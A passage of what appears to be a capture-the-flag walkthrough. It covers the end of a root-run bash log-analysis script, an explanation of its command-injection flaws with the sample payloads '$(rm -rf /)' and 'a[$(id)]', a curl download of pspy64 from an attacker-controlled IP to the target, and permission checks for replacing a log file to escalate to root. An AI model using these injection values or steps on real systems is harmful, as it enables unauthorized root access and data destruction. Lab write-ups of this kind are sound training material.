&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="si">%s%6s&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="si">%s%s&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">reset&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># ERROR Messages&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">error_messages&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">grep&lt;/span> &lt;span class="s1">&amp;#39; ERROR &amp;#39;&lt;/span> &lt;span class="s2">&amp;#34;$LOG_FILE&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">awk&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="sa">F&lt;/span>&lt;span class="s1">&amp;#39; ERROR &amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;{print $2}&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{RED}&lt;/span>&lt;span class="s2">[+] ERROR Messages:$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$error_messages&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">awk&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">red&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$RED&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">reset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$RESET&amp;#34;&lt;/span> &lt;span class="s1">&amp;#39;{print red $0 reset}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Eureka Errors&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">eureka_errors&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">grep&lt;/span> &lt;span class="s1">&amp;#39;Connect to http://localhost:8761.*failed: Connection refused&amp;#39;&lt;/span> &lt;span class="s2">&amp;#34;$LOG_FILE&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">eureka_count&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$eureka_errors&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">wc&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">l&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{YELLOW}&lt;/span>&lt;span class="s2">[+] Eureka Connection Failures:$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{YELLOW}&lt;/span>&lt;span class="s2">Count: $eureka_count$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$eureka_errors&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">tail&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">n&lt;/span> &lt;span class="mi">2&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">awk&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">yellow&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$YELLOW&amp;#34;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">reset&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$RESET&amp;#34;&lt;/span> &lt;span class="s1">&amp;#39;{print yellow $0 reset}&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">display_results&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{BLUE}&lt;/span>&lt;span class="s2">----- Log Analysis Report -----$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Successful logins&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{GREEN}&lt;/span>&lt;span class="s2">[+] Successful Login Counts:$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">total_success&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">user&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="s2">&amp;#34;${!successful_users[@]}&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">do&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">count&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">successful_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="p">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{GREEN}%6s&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;$count&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;$user&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">total_success&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">total_success&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">count&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">done&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{GREEN}&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">Total Successful Logins: $total_success$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Failed logins&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{RED}&lt;/span>&lt;span class="s2">[+] Failed Login Attempts:$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">total_failed&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">user&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="s2">&amp;#34;${!failed_users[@]}&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">do&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">count&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">failed_users&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="p">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{RED}%6s&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;$count&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;$user&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">total_failed&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">total_failed&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">count&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">done&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{RED}&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">Total Failed Login Attempts: $total_failed$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># HTTP status codes&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{CYAN}&lt;/span>&lt;span class="s2">[+] HTTP Status Code Distribution:$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">total_requests&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Sort codes numerically&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">IFS&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span> &lt;span class="nb">sorted&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">sort&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">n&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">t&lt;/span>&lt;span class="s1">&amp;#39;:&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">k1&lt;/span> &lt;span class="o">&amp;lt;&amp;lt;&amp;lt;&lt;/span>&lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{STATUS_CODES[*]}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">unset&lt;/span> &lt;span class="n">IFS&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">for&lt;/span> &lt;span class="n">entry&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{sorted[@]}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="n">do&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">code&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$entry&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">cut&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">d&lt;/span>&lt;span class="s1">&amp;#39;:&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">f1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">count&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;$entry&amp;#34;&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">cut&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">d&lt;/span>&lt;span class="s1">&amp;#39;:&amp;#39;&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">f2&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">total_requests&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="err">$&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="n">total_requests&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">count&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># Color coding&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="p">[[&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="n">code&lt;/span> &lt;span class="o">=~&lt;/span> &lt;span class="o">^&lt;/span>&lt;span class="mi">2&lt;/span> &lt;span class="p">]];&lt;/span> &lt;span class="n">then&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$GREEN&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="p">[[&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="n">code&lt;/span> &lt;span class="o">=~&lt;/span> &lt;span class="o">^&lt;/span>&lt;span class="mi">3&lt;/span> &lt;span class="p">]];&lt;/span> &lt;span class="n">then&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$YELLOW&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">elif&lt;/span> &lt;span class="p">[[&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="n">code&lt;/span> &lt;span class="o">=~&lt;/span> &lt;span class="o">^&lt;/span>&lt;span class="mi">4&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="err">$&lt;/span>&lt;span class="n">code&lt;/span> &lt;span class="o">=~&lt;/span> &lt;span class="o">^&lt;/span>&lt;span class="mi">5&lt;/span> &lt;span class="p">]];&lt;/span> &lt;span class="n">then&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$RED&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;$CYAN&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">fi&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">printf&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{color}%6s&lt;/span>&lt;span class="s2"> &lt;/span>&lt;span class="si">%s&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;$count&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;$code&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">done&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;$&lt;/span>&lt;span class="si">{CYAN}&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">Total HTTP Requests Tracked: $total_requests$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Main execution&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">analyze_logins&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">analyze_http_statuses&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">display_results&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">tee&lt;/span> &lt;span class="s2">&amp;#34;$OUTPUT_FILE&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">analyze_log_errors&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="n">tee&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">a&lt;/span> &lt;span class="s2">&amp;#34;$OUTPUT_FILE&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">echo&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">e&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s2">$&lt;/span>&lt;span class="si">{GREEN}&lt;/span>&lt;span class="s2">Analysis completed. Results saved to $OUTPUT_FILE$&lt;/span>&lt;span class="si">{RESET}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If we check the &lt;strong>analyze_http_statuses()&lt;/strong> &lt;em>function&lt;/em> we can see there is &lt;strong>unsanitized input handling&lt;/strong> and &lt;strong>potential command injection vulnerabilities&lt;/strong>.&lt;/p>
&lt;h4 id="1--command-injection-risk">1. &lt;strong>Command Injection Risk:&lt;/strong>&lt;/h4>
&lt;p>![[Pasted image 20250429114119.png]]&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;code>echo &amp;quot;$line&amp;quot;&lt;/code> interprets &lt;strong>shell metacharacters&lt;/strong> in the input.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>If &lt;code>$line&lt;/code> contains something like &lt;code>$(rm -rf /)&lt;/code>, it will &lt;strong>execute the command&lt;/strong> instead of treating it as text.&lt;/p>
&lt;/li>
&lt;/ul>
&lt;div class="pagebreak">&lt;/div>
&lt;h4 id="2-unvalidated-integer-comparison">2. &lt;strong>Unvalidated Integer Comparison:&lt;/strong>&lt;/h4>
&lt;p>![[Pasted image 20250429121049.png]]&lt;/p>
&lt;ul>
&lt;li>&lt;code>-eq&lt;/code> is a &lt;strong>numeric comparison&lt;/strong>.&lt;/li>
&lt;li>If &lt;code>$code&lt;/code> is &lt;strong>NOT a number&lt;/strong>, bash will &lt;strong>evaluate&lt;/strong> it&lt;/li>
&lt;li>If &lt;code>$code&lt;/code> is something like &lt;code>a[$(id)]&lt;/code>, then bash &lt;strong>will expand&lt;/strong> the &lt;strong>&lt;code>$(...)&lt;/code>&lt;/strong> &lt;strong>before comparison&lt;/strong>.&lt;/li>
&lt;/ul>
&lt;p>&lt;code>a can be treated like a variable name, where a[...] can be treated as a kind of array access (even if a doesn't exist, Bash doesn't care initially during parsing). So Bash parses inside the [ ... ], and executes the $(...).&lt;/code>&lt;/p>
&lt;h4 id="since-we-know-the-script-has-a-command-injection-vulnerability-its-time-to-verify-if-the-script-is-running-as-root-or-else-for-that-we-need-to-monitor-the-file-system-hence-we-will-be-using-pspy64-for-this-purpose">Since we know the script has a command injection vulnerability. Its time to verify if the script is running as &lt;em>root&lt;/em> or else. For that we need to monitor the file system. Hence we will be using &lt;strong>Pspy64&lt;/strong> for this purpose.&lt;/h4>
&lt;h2 id="12-monitoring-file-system-via-pyspy64">12. MONITORING FILE SYSTEM VIA PYSPY64:&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">#/ON-TARGET/#&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">curl -O http://10.10.16.91:1234/pspy64
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">chmod +x pspy64
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">./pspy64 -cpf -i &lt;span class="m">1000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250429124031-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We see that:&lt;/p>
&lt;ul>
&lt;li>The log analysis script (&lt;code>/opt/log_analyse.sh&lt;/code>) runs as&lt;strong>root&lt;/strong>(&lt;code>UID=0&lt;/code>).&lt;/li>
&lt;li>It processes log files (&lt;code>/var/www/web/*/log/application.log&lt;/code>) containing HTTP status codes.&lt;/li>
&lt;li>If an attacker can &lt;strong>modify the log file&lt;/strong>, they can inject malicious payloads that get executed when parsed.&lt;/li>
&lt;li>&lt;strong>Log Files Are Often Writable&lt;/strong>&lt;/li>
&lt;li>Many apps allow logging unvalidated input (e.g., user agents, URLs).&lt;/li>
&lt;li>If log rotation isn’t strict, attackers can append malicious entries.&lt;/li>
&lt;/ul>
&lt;h2 id="13-check-execution-format-of-the-log">13. CHECK EXECUTION FORMAT OF THE LOG:&lt;/h2>
&lt;p>In order to craft the payload we need to know what is the format of the log which the script executes every time:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">tail /var/www/web/cloud-gateway/log/application.log -n3
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250429145832-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>The &lt;code>log_analyse.sh&lt;/code> script is likely parsing logs in this format:&lt;/p>
&lt;ul>
&lt;li>It &lt;strong>searches for &lt;code>HTTP.*Status:&lt;/code>&lt;/strong> (&lt;code>grep &amp;quot;HTTP.*Status: &amp;quot;&lt;/code>).&lt;/li>
&lt;li>Then &lt;strong>extracts the status code&lt;/strong> (&lt;code>grep -oP 'Status: \K.*'&lt;/code>).&lt;/li>
&lt;/ul>
&lt;h4 id="our-goal-1">OUR GOAL:&lt;/h4>
&lt;ul>
&lt;li>Check if the current user have the permission to modify or delete the application.log&lt;/li>
&lt;li>If there is a permission to delete the application.log we can replace our malicious one with the same name as &lt;strong>application.log&lt;/strong> and can obtain the root.&lt;/li>
&lt;/ul>
&lt;h2 id="14-privilege-escalation-for-root">14. PRIVILEGE ESCALATION FOR ROOT:&lt;/h2>
&lt;h3 id="1-check-the-user-permission-for-modifying-or-deleting-the-file-applicationlog">1. Check the user permission for modifying or deleting the file &lt;strong>application.log&lt;/strong>&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">groups
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls -l /var/www/web/user-management-service/log/application.log
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250429143020-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250429114119-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
&lt;p>We dont have modification/edit permission on the file &lt;strong>aplication.log&lt;/strong> as a &lt;em>developers group user&lt;/em>&lt;/p>
&lt;p>Lets check whether we have a permission of its parent directory so we can remove or
replace this file:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls -l /var/www/web/user-management-service/log/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ls -ld /var/www/web/user-management-service/log/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
&lt;figure >
&lt;div class="flex justify-center ">
&lt;div class="w-100" >&lt;img src="./Pasted%20image%2020250429143545-1.png" alt="" loading="lazy" data-zoomable />&lt;/div>
&lt;/div>&lt;/figure>
&lt;/p>
